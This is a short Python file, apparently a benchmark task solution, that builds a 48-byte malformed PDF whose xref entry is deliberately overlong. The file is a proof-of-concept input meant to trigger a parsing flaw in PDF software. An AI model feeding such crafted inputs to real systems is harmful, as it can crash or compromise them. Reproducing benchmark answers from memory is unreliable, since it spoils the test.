import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Construct a minimal PDF with an xref table containing an overlong entry.
        # Header: 9 bytes
        # xref tag: 5 bytes
        # Subsection header (object 0, count 1): 4 bytes
        # Malformed entry: 30 bytes of '0' (standard entry is 20 bytes)
        # Total length: 48 bytes, matching ground truth.
        return b"%PDF-1.0\nxref\n0 1\n" + b"0" * 30